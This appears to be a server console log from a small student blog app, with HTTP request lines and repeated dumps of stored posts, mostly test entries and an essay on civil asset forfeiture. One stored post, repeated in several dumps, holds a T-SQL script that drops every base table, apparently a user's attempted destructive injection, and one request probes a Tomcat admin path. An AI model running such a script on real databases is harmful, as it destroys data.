+    blogText: 'For decades police have been under harsh scrutiny for their behavioral practices. In particular, the practice of civil asset forfeiture has been highly controversial. Civil asset forfeiture is a process where a government law enforcement agency seizes property on the basis that it may be connected to a crime (Crawford 260). Unlike criminal asset forfeiture, civil asset forfeiture is an action filed against property itself and not the owner (Crawford 260). A civil asset forfeiture does not need to be accompanied by criminal charges to the owner and has no other legal implication beyond loss of property (Crawford 258). Civil asset forfeiture started becoming commonplace in America in the 1970s, when Congress passed the Comprehensive Drug Abuse Prevention and Control Act, which gave law enforcement the right to seize drugs and equipment related to its manufacture, storage or distribution (Crawford 261-62). Further legislation expanded seizure powers to include alleged proceeds and real property related to criminal activity (Crawford 262). While those laws are federal, all states have their own forfeiture laws, and the federal laws set a precedent for how forfeitures should be utilized by police. Forfeiture has proved to be an effective tool for law enforcement because it enables them to both seize the proceeds from alleged crimes, as well as seize property that may be used to facilitate crime. However, current civil asset forfeiture laws are fundamentally flawed and need to be revised to protect citizens and prevent abuse.\n\nMany current forfeiture laws provide police with questionable incentives to make seizures of property. Since forfeitures processed through most state laws, as well as those processed under federal law, direct most of the proceeds to law enforcement, there is a serious conflict of interest and the creation of flawed incentives. Law enforcement agencies may become motivated to prioritize cases on the basis of profitability instead of fair application of the law. While state laws do vary, all but eight states give at least 50% of the proceeds from forfeitures to the law enforcement agency, with 26 states giving 100% of the proceeds to law enforcement (Holcomb et al. 277). A 2001 survey of 770 police executives and managers found that “almost forty (40) percent of respondents agreed or strongly agreed to the statement that civil forfeiture is ‘necessary as a budget supplement’” (Holcomb 275). The fact that some police view the income as necessary implies that revenue could be a factor when police are considering making forfeiture actions. For example, “officers from the Volusia County Sheriff’s Office in Florida who stopped vehicles on southbound I-95 […] routinely confiscated any money over one-hundred dollars under the assumption that money in such quantity must be drug money” (Chi 1646). Such actions do little to combat crime and serve little purpose beyond income generation. Volusia officers, as well as many other agencies, would “haggl[e] with the motorists […] allowing the motorists to retain a portion of the money in exchange for an agreement not to contest the forfeiture” in order to make the income more reliable (Chi 1646). In such instances it appears that the law enforcement personnel are primarily motivated by revenue generation in their policing. This conflicts with both the intended purpose of police, to protect and serve, and the ethical standards that police should be held to. Additionally, the ability of police to even partially self-finance can make them less politically accountable to the legislature, who is primarily responsible for their funding. The profitability of civil asset forfeiture inherently creates a conflict of interest and will encourage seizures for the sake of revenue until the incentive is removed.\n\nFurthermore, innocent property can be easily seized in many states that require low burdens of proof to make forfeiture actions. For example, in Massachusetts, the law only requires probable cause to seize assets. The law also enables police to seize “any vehicles, money, or real property used in connection with a controlled substance” (Crawford 265). In essence, the seizure of drug-related property may seem reasonable, but because only probable cause must be provided, the state does not need to prove a connection between the property and a drug transaction (Crawford 264). When establishing probable cause in Massachusetts, prosecutors can use questionable evidence such as “hearsay evidence—which would be inadmissible in a trial— in forfeiture actions” (Crawford 268). Thirteen states require only probable cause to seize assets and only four require assets to be connected to criminal activity beyond a reasonable doubt, which puts many law abiding property owners at risk (Holcomb et al. 278). Considering the undemanding requirements for establishing probable cause, many legal possessions can be considered suspicious and be confiscated. In the court case United States v. $124,700 it was ruled that “‘[p]ossession of a large sum of cash is ‘strong evidence’ of a connection to drug activity’” (qtd. in Moorse 779). The ease with which prosecutors can attain probable cause, using little to no substantial evidence, puts many law abiding people and their property in jeopardy.\n\nForfeiture laws, because they are a civil action against property, rather than a person, have unique procedures that often provide little protection for implicated persons. Rather than having a trial, once the state has started an action against a property, the prosecutor merely submits affidavits that established that the burden of proof is met to justify a seizure (Crawford 265). In 36 states and under federal law, after the property is seized, the burden of proving the innocence of the property is placed solely on the owner (Holcomb et al. 277, Crawford 264). Due to the ‘guilty until proven innocent’ nature of civil forfeiture, paired with often low burdens of proof, many innocent property owners are placed at risk of having their property seized.\n\nHaving wrongfully seized property returned can be a lengthy and potentially expensive process. For example, in 2009, a motel in Massachusetts was seized with probable cause that the owner was involved in criminal activity, on the basis that 15 of the roughly 125,000 patrons served over two decades had been arrested on drug charges (Crawford 257-259). After a three-year legal battle, costing the owners over $100,000, the property was returned; had the case not been taken by a public interest law firm pro bono once the motel owners exhausted their funds, the state would have kept the property. Similarly, the high legal fees associated with contesting a forfeiture are often a barrier preventing property owners from attempting to retain their property. Because the cases are civil in nature, under state laws the property owner does not necessarily have the right to a public defender if they cannot afford a lawyer, as the Sixth Amendment does not apply to non-criminal cases (Crawford 273, 282). As a result forfeiture actions are disproportionately detrimental to indigent parties who will often choose to forgo legal action (Crawford 277-78). Furthermore, law enforcement may choose to specifically choose to target persons who may not have the funds to contest a forfeiture. As in the case of the motel discussed previously, while it was not the only motel where arrests had been made, it was the only one independently owned and operated; consequently it was the only one that saw forfeiture actions taken against it (Crawford 273). This illustrates how the flawed legal process of civil asset forfeiture can victimize property owners and facilitate abuse of forfeiture powers.\n\nThere have been previous attempts to reform civil asset forfeiture. In the 1990s, civil asset forfeiture started to draw large amounts of criticism, both ethically and constitutionally under the First, Fifth, Sixth and Eighth Amendments (Crawford 263). The constitutional challenges failed and the law was upheld; however, legislation would be passed to address the prevalent issues with federal forfeiture laws (Crawford 263). The first reform of federal forfeiture laws came in the Civil Asset Forfeiture Reform Act (CAFRA) in 2000 (Crawford 264). CAFRA would provide for the appointment of legal counsel in cases where a property owner\'s primary residence is in jeopardy, if they request it (Crawford 264). Also, CAFRA rendered the government liable for the property owner’s attorney fees and other expenses from litigation when “the claimant ‘substantially prevails’” (Crawford 264). This would become a massive benefit to law-abiding citizens whose property was wrongly seized, but it provided no benefit to the claimant if the case was lost. In addition, CAFRA increased the burden of proof from probable cause to “preponderance of evidence,” (Crawford 265). Preponderance of evidence is one degree of certainty above probable cause and “implies a ‘more likely than not’ character” (Holcomb et al 277). Raising the burden of proof provided suspected persons and their property with some more protection and made their assets more difficult to seize. While CAFRA did contain valuable reforms, it pertained exclusively to federal laws and in no way addressed forfeiture under state laws, and while it did raise the burden of proof, it still may provide citizens with inadequate protection.',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:58:00.898Z,
+    __v: 0 } ]
+[0mGET /api/blog [36m304 [0m3.687 ms - -[0m
+[0mGET /manager/html [33m404 [0m1.072 ms - 1395[0m
+[0mGET / [32m200 [0m11.646 ms - 7433[0m
+[0mGET /lib/angular-ui-router.min.js [32m200 [0m2.388 ms - 19546[0m
+[0mGET /blogApp.js [32m200 [0m0.863 ms - 9242[0m
+[0mGET /common/nav/navigation.js [32m200 [0m1.665 ms - 756[0m
+[0mGET /lib/angular-route.min.js [32m200 [0m0.783 ms - 3884[0m
+[0mGET /nav/navigation.html [32m200 [0m1.049 ms - 693[0m
+[0mGET /favicon.ico [33m404 [0m14.752 ms - 1395[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9f9,
+    blogTitle: 'hmm',
+    blogText: 'DECLARE @sql NVARCHAR(max)=\'\'\n\nSELECT @sql += \' Drop table \' + QUOTENAME(TABLE_SCHEMA) + \'.\'+ QUOTENAME(TABLE_NAME) + \'; \'\nFROM   INFORMATION_SCHEMA.TABLES\nWHERE  TABLE_TYPE = \'BASE TABLE\'\n\nExec Sp_executesql @sql',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:33:01.566Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9fa,
+    blogTitle: 'My name is Grant',
+    blogText: 'And I suck.',
+    userName: 'Grant_Sucks',
+    userEmail: 'grant@sucks.biz',
+    createdOn: 2019-04-22T02:33:01.810Z,
+    __v: 0 },
+  { _id: 5cbd2db8bae1b279e4edd9fc,
+    blogTitle: 'Issues with Civil Asset Forfeiture',
+    blogText: 'For decades police have been under harsh scrutiny for their behavioral practices. In particular, the practice of civil asset forfeiture has been highly controversial. Civil asset forfeiture is a process where a government law enforcement agency seizes property on the basis that it may be connected to a crime (Crawford 260). Unlike criminal asset forfeiture, civil asset forfeiture is an action filed against property itself and not the owner (Crawford 260). A civil asset forfeiture does not need to be accompanied by criminal charges to the owner and has no other legal implication beyond loss of property (Crawford 258). Civil asset forfeiture started becoming commonplace in America in the 1970s, when Congress passed the Comprehensive Drug Abuse Prevention and Control Act, which gave law enforcement the right to seize drugs and equipment related to its manufacture, storage or distribution (Crawford 261-62). Further legislation expanded seizure powers to include alleged proceeds and real property related to criminal activity (Crawford 262). While those laws are federal, all states have their own forfeiture laws, and the federal laws set a precedent for how forfeitures should be utilized by police. Forfeiture has proved to be an effective tool for law enforcement because it enables them to both seize the proceeds from alleged crimes, as well as seize property that may be used to facilitate crime. However, current civil asset forfeiture laws are fundamentally flawed and need to be revised to protect citizens and prevent abuse.\n\nMany current forfeiture laws provide police with questionable incentives to make seizures of property. Since forfeitures processed through most state laws, as well as those processed under federal law, direct most of the proceeds to law enforcement, there is a serious conflict of interest and the creation of flawed incentives. Law enforcement agencies may become motivated to prioritize cases on the basis of profitability instead of fair application of the law. While state laws do vary, all but eight states give at least 50% of the proceeds from forfeitures to the law enforcement agency, with 26 states giving 100% of the proceeds to law enforcement (Holcomb et al. 277). A 2001 survey of 770 police executives and managers found that “almost forty (40) percent of respondents agreed or strongly agreed to the statement that civil forfeiture is ‘necessary as a budget supplement’” (Holcomb 275). The fact that some police view the income as necessary implies that revenue could be a factor when police are considering making forfeiture actions. For example, “officers from the Volusia County Sheriff’s Office in Florida who stopped vehicles on southbound I-95 […] routinely confiscated any money over one-hundred dollars under the assumption that money in such quantity must be drug money” (Chi 1646). Such actions do little to combat crime and serve little purpose beyond income generation. Volusia officers, as well as many other agencies, would “haggl[e] with the motorists […] allowing the motorists to retain a portion of the money in exchange for an agreement not to contest the forfeiture” in order to make the income more reliable (Chi 1646). In such instances it appears that the law enforcement personnel are primarily motivated by revenue generation in their policing. This conflicts with both the intended purpose of police, to protect and serve, and the ethical standards that police should be held to. Additionally, the ability of police to even partially self-finance can make them less politically accountable to the legislature, who is primarily responsible for their funding. The profitability of civil asset forfeiture inherently creates a conflict of interest and will encourage seizures for the sake of revenue until the incentive is removed.\n\nFurthermore, innocent property can be easily seized in many states that require low burdens of proof to make forfeiture actions. For example, in Massachusetts, the law only requires probable cause to seize assets. The law also enables police to seize “any vehicles, money, or real property used in connection with a controlled substance” (Crawford 265). In essence, the seizure of drug-related property may seem reasonable, but because only probable cause must be provided, the state does not need to prove a connection between the property and a drug transaction (Crawford 264). When establishing probable cause in Massachusetts, prosecutors can use questionable evidence such as “hearsay evidence—which would be inadmissible in a trial— in forfeiture actions” (Crawford 268). Thirteen states require only probable cause to seize assets and only four require assets to be connected to criminal activity beyond a reasonable doubt, which puts many law abiding property owners at risk (Holcomb et al. 278). Considering the undemanding requirements for establishing probable cause, many legal possessions can be considered suspicious and be confiscated. In the court case United States v. $124,700 it was ruled that “‘[p]ossession of a large sum of cash is ‘strong evidence’ of a connection to drug activity’” (qtd. in Moorse 779). The ease with which prosecutors can attain probable cause, using little to no substantial evidence, puts many law abiding people and their property in jeopardy.\n\nForfeiture laws, because they are a civil action against property, rather than a person, have unique procedures that often provide little protection for implicated persons. Rather than having a trial, once the state has started an action against a property, the prosecutor merely submits affidavits that established that the burden of proof is met to justify a seizure (Crawford 265). In 36 states and under federal law, after the property is seized, the burden of proving the innocence of the property is placed solely on the owner (Holcomb et al. 277, Crawford 264). Due to the ‘guilty until proven innocent’ nature of civil forfeiture, paired with often low burdens of proof, many innocent property owners are placed at risk of having their property seized.\n\nHaving wrongfully seized property returned can be a lengthy and potentially expensive process. For example, in 2009, a motel in Massachusetts was seized with probable cause that the owner was involved in criminal activity, on the basis that 15 of the roughly 125,000 patrons served over two decades had been arrested on drug charges (Crawford 257-259). After a three-year legal battle, costing the owners over $100,000, the property was returned; had the case not been taken by a public interest law firm pro bono once the motel owners exhausted their funds, the state would have kept the property. Similarly, the high legal fees associated with contesting a forfeiture are often a barrier preventing property owners from attempting to retain their property. Because the cases are civil in nature, under state laws the property owner does not necessarily have the right to a public defender if they cannot afford a lawyer, as the Sixth Amendment does not apply to non-criminal cases (Crawford 273, 282). As a result forfeiture actions are disproportionately detrimental to indigent parties who will often choose to forgo legal action (Crawford 277-78). Furthermore, law enforcement may choose to specifically choose to target persons who may not have the funds to contest a forfeiture. As in the case of the motel discussed previously, while it was not the only motel where arrests had been made, it was the only one independently owned and operated; consequently it was the only one that saw forfeiture actions taken against it (Crawford 273). This illustrates how the flawed legal process of civil asset forfeiture can victimize property owners and facilitate abuse of forfeiture powers.\n\nThere have been previous attempts to reform civil asset forfeiture. In the 1990s, civil asset forfeiture started to draw large amounts of criticism, both ethically and constitutionally under the First, Fifth, Sixth and Eighth Amendments (Crawford 263). The constitutional challenges failed and the law was upheld; however, legislation would be passed to address the prevalent issues with federal forfeiture laws (Crawford 263). The first reform of federal forfeiture laws came in the Civil Asset Forfeiture Reform Act (CAFRA) in 2000 (Crawford 264). CAFRA would provide for the appointment of legal counsel in cases where a property owner\'s primary residence is in jeopardy, if they request it (Crawford 264). Also, CAFRA rendered the government liable for the property owner’s attorney fees and other expenses from litigation when “the claimant ‘substantially prevails’” (Crawford 264). This would become a massive benefit to law-abiding citizens whose property was wrongly seized, but it provided no benefit to the claimant if the case was lost. In addition, CAFRA increased the burden of proof from probable cause to “preponderance of evidence,” (Crawford 265). Preponderance of evidence is one degree of certainty above probable cause and “implies a ‘more likely than not’ character” (Holcomb et al 277). Raising the burden of proof provided suspected persons and their property with some more protection and made their assets more difficult to seize. While CAFRA did contain valuable reforms, it pertained exclusively to federal laws and in no way addressed forfeiture under state laws, and while it did raise the burden of proof, it still may provide citizens with inadequate protection.',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:58:00.898Z,
+    __v: 0 } ]
+[0mGET /api/blog [32m200 [0m37.580 ms - 10852[0m
+{ blogTitle: 'Prof blog',
+  blogText: 'Test',
+  userName: 'Thomas J Rogers',
+  userEmail: 'tjrtechgm@gmail.com' }
+{ _id: 5cbd9651bae1b279e4edd9fd,
+  blogTitle: 'Prof blog',
+  blogText: 'Test',
+  userName: 'Thomas J Rogers',
+  userEmail: 'tjrtechgm@gmail.com',
+  createdOn: 2019-04-22T10:24:17.360Z,
+  __v: 0 }
+[0mPOST /api/blog [32m201 [0m30.636 ms - 186[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9f9,
+    blogTitle: 'hmm',
+    blogText: 'DECLARE @sql NVARCHAR(max)=\'\'\n\nSELECT @sql += \' Drop table \' + QUOTENAME(TABLE_SCHEMA) + \'.\'+ QUOTENAME(TABLE_NAME) + \'; \'\nFROM   INFORMATION_SCHEMA.TABLES\nWHERE  TABLE_TYPE = \'BASE TABLE\'\n\nExec Sp_executesql @sql',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:33:01.566Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9fa,
+    blogTitle: 'My name is Grant',
+    blogText: 'And I suck.',
+    userName: 'Grant_Sucks',
+    userEmail: 'grant@sucks.biz',
+    createdOn: 2019-04-22T02:33:01.810Z,
+    __v: 0 },
+  { _id: 5cbd2db8bae1b279e4edd9fc,
+    blogTitle: 'Issues with Civil Asset Forfeiture',
+    blogText: 'For decades police have been under harsh scrutiny for their behavioral practices. In particular, the practice of civil asset forfeiture has been highly controversial. Civil asset forfeiture is a process where a government law enforcement agency seizes property on the basis that it may be connected to a crime (Crawford 260). Unlike criminal asset forfeiture, civil asset forfeiture is an action filed against property itself and not the owner (Crawford 260). A civil asset forfeiture does not need to be accompanied by criminal charges to the owner and has no other legal implication beyond loss of property (Crawford 258). Civil asset forfeiture started becoming commonplace in America in the 1970s, when Congress passed the Comprehensive Drug Abuse Prevention and Control Act, which gave law enforcement the right to seize drugs and equipment related to its manufacture, storage or distribution (Crawford 261-62). Further legislation expanded seizure powers to include alleged proceeds and real property related to criminal activity (Crawford 262). While those laws are federal, all states have their own forfeiture laws, and the federal laws set a precedent for how forfeitures should be utilized by police. Forfeiture has proved to be an effective tool for law enforcement because it enables them to both seize the proceeds from alleged crimes, as well as seize property that may be used to facilitate crime. However, current civil asset forfeiture laws are fundamentally flawed and need to be revised to protect citizens and prevent abuse.\n\nMany current forfeiture laws provide police with questionable incentives to make seizures of property. Since forfeitures processed through most state laws, as well as those processed under federal law, direct most of the proceeds to law enforcement, there is a serious conflict of interest and the creation of flawed incentives. Law enforcement agencies may become motivated to prioritize cases on the basis of profitability instead of fair application of the law. While state laws do vary, all but eight states give at least 50% of the proceeds from forfeitures to the law enforcement agency, with 26 states giving 100% of the proceeds to law enforcement (Holcomb et al. 277). A 2001 survey of 770 police executives and managers found that “almost forty (40) percent of respondents agreed or strongly agreed to the statement that civil forfeiture is ‘necessary as a budget supplement’” (Holcomb 275). The fact that some police view the income as necessary implies that revenue could be a factor when police are considering making forfeiture actions. For example, “officers from the Volusia County Sheriff’s Office in Florida who stopped vehicles on southbound I-95 […] routinely confiscated any money over one-hundred dollars under the assumption that money in such quantity must be drug money” (Chi 1646). Such actions do little to combat crime and serve little purpose beyond income generation. Volusia officers, as well as many other agencies, would “haggl[e] with the motorists […] allowing the motorists to retain a portion of the money in exchange for an agreement not to contest the forfeiture” in order to make the income more reliable (Chi 1646). In such instances it appears that the law enforcement personnel are primarily motivated by revenue generation in their policing. This conflicts with both the intended purpose of police, to protect and serve, and the ethical standards that police should be held to. Additionally, the ability of police to even partially self-finance can make them less politically accountable to the legislature, who is primarily responsible for their funding. The profitability of civil asset forfeiture inherently creates a conflict of interest and will encourage seizures for the sake of revenue until the incentive is removed.\n\nFurthermore, innocent property can be easily seized in many states that require low burdens of proof to make forfeiture actions. For example, in Massachusetts, the law only requires probable cause to seize assets. The law also enables police to seize “any vehicles, money, or real property used in connection with a controlled substance” (Crawford 265). In essence, the seizure of drug-related property may seem reasonable, but because only probable cause must be provided, the state does not need to prove a connection between the property and a drug transaction (Crawford 264). When establishing probable cause in Massachusetts, prosecutors can use questionable evidence such as “hearsay evidence—which would be inadmissible in a trial— in forfeiture actions” (Crawford 268). Thirteen states require only probable cause to seize assets and only four require assets to be connected to criminal activity beyond a reasonable doubt, which puts many law abiding property owners at risk (Holcomb et al. 278). Considering the undemanding requirements for establishing probable cause, many legal possessions can be considered suspicious and be confiscated. In the court case United States v. $124,700 it was ruled that “‘[p]ossession of a large sum of cash is ‘strong evidence’ of a connection to drug activity’” (qtd. in Moorse 779). The ease with which prosecutors can attain probable cause, using little to no substantial evidence, puts many law abiding people and their property in jeopardy.\n\nForfeiture laws, because they are a civil action against property, rather than a person, have unique procedures that often provide little protection for implicated persons. Rather than having a trial, once the state has started an action against a property, the prosecutor merely submits affidavits that established that the burden of proof is met to justify a seizure (Crawford 265). In 36 states and under federal law, after the property is seized, the burden of proving the innocence of the property is placed solely on the owner (Holcomb et al. 277, Crawford 264). Due to the ‘guilty until proven innocent’ nature of civil forfeiture, paired with often low burdens of proof, many innocent property owners are placed at risk of having their property seized.\n\nHaving wrongfully seized property returned can be a lengthy and potentially expensive process. For example, in 2009, a motel in Massachusetts was seized with probable cause that the owner was involved in criminal activity, on the basis that 15 of the roughly 125,000 patrons served over two decades had been arrested on drug charges (Crawford 257-259). After a three-year legal battle, costing the owners over $100,000, the property was returned; had the case not been taken by a public interest law firm pro bono once the motel owners exhausted their funds, the state would have kept the property. Similarly, the high legal fees associated with contesting a forfeiture are often a barrier preventing property owners from attempting to retain their property. Because the cases are civil in nature, under state laws the property owner does not necessarily have the right to a public defender if they cannot afford a lawyer, as the Sixth Amendment does not apply to non-criminal cases (Crawford 273, 282). As a result forfeiture actions are disproportionately detrimental to indigent parties who will often choose to forgo legal action (Crawford 277-78). Furthermore, law enforcement may choose to specifically choose to target persons who may not have the funds to contest a forfeiture. As in the case of the motel discussed previously, while it was not the only motel where arrests had been made, it was the only one independently owned and operated; consequently it was the only one that saw forfeiture actions taken against it (Crawford 273). This illustrates how the flawed legal process of civil asset forfeiture can victimize property owners and facilitate abuse of forfeiture powers.\n\nThere have been previous attempts to reform civil asset forfeiture. In the 1990s, civil asset forfeiture started to draw large amounts of criticism, both ethically and constitutionally under the First, Fifth, Sixth and Eighth Amendments (Crawford 263). The constitutional challenges failed and the law was upheld; however, legislation would be passed to address the prevalent issues with federal forfeiture laws (Crawford 263). The first reform of federal forfeiture laws came in the Civil Asset Forfeiture Reform Act (CAFRA) in 2000 (Crawford 264). CAFRA would provide for the appointment of legal counsel in cases where a property owner\'s primary residence is in jeopardy, if they request it (Crawford 264). Also, CAFRA rendered the government liable for the property owner’s attorney fees and other expenses from litigation when “the claimant ‘substantially prevails’” (Crawford 264). This would become a massive benefit to law-abiding citizens whose property was wrongly seized, but it provided no benefit to the claimant if the case was lost. In addition, CAFRA increased the burden of proof from probable cause to “preponderance of evidence,” (Crawford 265). Preponderance of evidence is one degree of certainty above probable cause and “implies a ‘more likely than not’ character” (Holcomb et al 277). Raising the burden of proof provided suspected persons and their property with some more protection and made their assets more difficult to seize. While CAFRA did contain valuable reforms, it pertained exclusively to federal laws and in no way addressed forfeiture under state laws, and while it did raise the burden of proof, it still may provide citizens with inadequate protection.',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:58:00.898Z,
+    __v: 0 },
+  { _id: 5cbd9651bae1b279e4edd9fd,
+    blogTitle: 'Prof blog',
+    blogText: 'Test',
+    userName: 'Thomas J Rogers',
+    userEmail: 'tjrtechgm@gmail.com',
+    createdOn: 2019-04-22T10:24:17.360Z,
+    __v: 0 } ]
+[0mGET /api/blog [32m200 [0m2.685 ms - 11034[0m
+Finding blog details { blogID: '5cbd9651bae1b279e4edd9fd' }
+{ _id: 5cbd9651bae1b279e4edd9fd,
+  blogTitle: 'Prof blog',
+  blogText: 'Test',
+  userName: 'Thomas J Rogers',
+  userEmail: 'tjrtechgm@gmail.com',
+  createdOn: 2019-04-22T10:24:17.360Z,
+  __v: 0 }
+[0mGET /api/blog/5cbd9651bae1b279e4edd9fd [32m200 [0m3.889 ms - 186[0m
+Finding blog details { blogID: '5cbd9651bae1b279e4edd9fd' }
+{ _id: 5cbd9651bae1b279e4edd9fd,
+  blogTitle: 'Prof blog',
+  blogText: 'Test',
+  userName: 'Thomas J Rogers',
+  userEmail: 'tjrtechgm@gmail.com',
+  createdOn: 2019-04-22T10:24:17.360Z,
+  __v: 0 }
+[0mGET /api/blog/5cbd9651bae1b279e4edd9fd [36m304 [0m2.141 ms - -[0m
+Updating Blog Entry : 5cbd9651bae1b279e4edd9fd
+{ blogTitle: 'Prof blog', blogText: 'Test!' }
+[0mPUT /api/blog/5cbd9651bae1b279e4edd9fd [32m201 [0m7.168 ms - 186[0m
+Fetching all blog documents
+[ { _id: 5cbd2605d8ae9979972ad23a,
+    blogTitle: 'test',
+    blogText: 'test',
+    userName: 'Grant Hartenstine',
+    userEmail: '1234@gmail.com',
+    createdOn: 2019-04-22T02:25:09.340Z,
+    __v: 0 },
+  { _id: 5cbd2644d8ae9979972ad23b,
+    blogTitle: 'second account',
+    blogText: 'testing',
+    userName: 'Test Account',
+    userEmail: 'test@gmail.com',
+    createdOn: 2019-04-22T02:26:12.210Z,
+    __v: 0 },
+  { _id: 5cbd276dbae1b279e4edd9f6,
+    blogTitle: 'Get a life',
+    blogText: 'You\'re been hackskeepered',
+    userName: 'Anonymous Troll',
+    userEmail: 'troll@gmail.com',
+    createdOn: 2019-04-22T02:31:09.006Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9f9,
+    blogTitle: 'hmm',
+    blogText: 'DECLARE @sql NVARCHAR(max)=\'\'\n\nSELECT @sql += \' Drop table \' + QUOTENAME(TABLE_SCHEMA) + \'.\'+ QUOTENAME(TABLE_NAME) + \'; \'\nFROM   INFORMATION_SCHEMA.TABLES\nWHERE  TABLE_TYPE = \'BASE TABLE\'\n\nExec Sp_executesql @sql',
+    userName: 'Jeep Guy',
+    userEmail: 'nut@tissues.tv',
+    createdOn: 2019-04-22T02:33:01.566Z,
+    __v: 0 },
+  { _id: 5cbd27ddbae1b279e4edd9fa,
+    blogTitle: 'My name is Grant',
+    blogText: 'And I suck.',
+    userName: 'Grant_Sucks',
+    userEmail: 'grant@sucks.biz',
+    createdOn: 2019-04-22T02:33:01.810Z,
+    __v: 0 },
+  { _id: 5cbd2db8bae1b279e4edd9fc,
+    blogTitle: 'Issues with Civil Asset Forfeiture',
+    blogText: 'For decades police have been under harsh scrutiny for their behavioral practices. In particular, the practice of civil asset forfeiture has been highly controversial. Civil asset forfeiture is a process where a government law enforcement agency seizes property on the basis that it may be connected to a crime (Crawford 260). Unlike criminal asset forfeiture, civil asset forfeiture is an action filed against property itself and not the owner (Crawford 260). A civil asset forfeiture does not need to be accompanied by criminal charges to the owner and has no other legal implication beyond loss of property (Crawford 258). Civil asset forfeiture started becoming commonplace in America in the 1970s, when Congress passed the Comprehensive Drug Abuse Prevention and Control Act, which gave law enforcement the right to seize drugs and equipment related to its manufacture, storage or distribution (Crawford 261-62). Further legislation expanded seizure powers to include alleged proceeds and real property related to criminal activity (Crawford 262). While those laws are federal, all states have their own forfeiture laws, and the federal laws set a precedent for how forfeitures should be utilized by police. Forfeiture has proved to be an effective tool for law enforcement because it enables them to both seize the proceeds from alleged crimes, as well as seize property that may be used to facilitate crime. However, current civil asset forfeiture laws are fundamentally flawed and need to be revised to protect citizens and prevent abuse.\n\nMany current forfeiture laws provide police with questionable incentives to make seizures of property. Since forfeitures processed through most state laws, as well as those processed under federal law, direct most of the proceeds to law enforcement, there is a serious conflict of interest and the creation of flawed incentives. Law enforcement agencies may become motivated to prioritize cases on the basis of profitability instead of fair application of the law. While state laws do vary, all but eight states give at least 50% of the proceeds from forfeitures to the law enforcement agency, with 26 states giving 100% of the proceeds to law enforcement (Holcomb et al. 277). A 2001 survey of 770 police executives and managers found that “almost forty (40) percent of respondents agreed or strongly agreed to the statement that civil forfeiture is ‘necessary as a budget supplement’” (Holcomb 275). The fact that some police view the income as necessary implies that revenue could be a factor when police are considering making forfeiture actions. For example, “officers from the Volusia County Sheriff’s Office in Florida who stopped vehicles on southbound I-95 […] routinely confiscated any money over one-hundred dollars under the assumption that money in such quantity must be drug money” (Chi 1646). Such actions do little to combat crime and serve little purpose beyond income generation. Volusia officers, as well as many other agencies, would “haggl[e] with the motorists […] allowing the motorists to retain a portion of the money in exchange for an agreement not to contest the forfeiture” in order to make the income more reliable (Chi 1646). In such instances it appears that the law enforcement personnel are primarily motivated by revenue generation in their policing. This conflicts with both the intended purpose of police, to protect and serve, and the ethical standards that police should be held to. Additionally, the ability of police to even partially self-finance can make them less politically accountable to the legislature, who is primarily responsible for their funding. The profitability of civil asset forfeiture inherently creates a conflict of interest and will encourage seizures for the sake of revenue until the incentive is removed.\n\nFurthermore, innocent property can be easily seized in many states that require low burdens of proof to make forfeiture actions. For example, in Massachusetts, the law only requires probable cause to seize assets. The law also enables police to seize “any vehicles, money, or real property used in connection with a controlled substance” (Crawford 265). In essence, the seizure of drug-related property may seem reasonable, but because only probable cause must be provided, the state does not need to prove a connection between the property and a drug transaction (Crawford 264). When establishing probable cause in Massachusetts, prosecutors can use questionable evidence such as “hearsay evidence—which would be inadmissible in a trial— in forfeiture actions” (Crawford 268). Thirteen states require only probable cause to seize assets and only four require assets to be connected to criminal activity beyond a reasonable doubt, which puts many law abiding property owners at risk (Holcomb et al. 278). Considering the undemanding requirements for establishing probable cause, many legal possessions can be considered suspicious and be confiscated. In the court case United States v. $124,700 it was ruled that “‘[p]ossession of a large sum of cash is ‘strong evidence’ of a connection to drug activity’” (qtd. in Moorse 779). The ease with which prosecutors can attain probable cause, using little to no substantial evidence, puts many law abiding people and their property in jeopardy.\n\nForfeiture laws, because they are a civil action against property, rather than a person, have unique procedures that often provide little protection for implicated persons. Rather than having a trial, once the state has started an action against a property, the prosecutor merely submits affidavits that established that the burden of proof is met to justify a seizure (Crawford 265). In 36 states and under federal law, after the property is seized, the burden of proving the innocence of the property is placed solely on the owner (Holcomb et al. 277, Crawford 264). Due to the ‘guilty until proven innocent’ nature of civil forfeiture, paired with often low burdens of proof, many innocent property owners are placed at risk of having their property seized.\n\nHaving 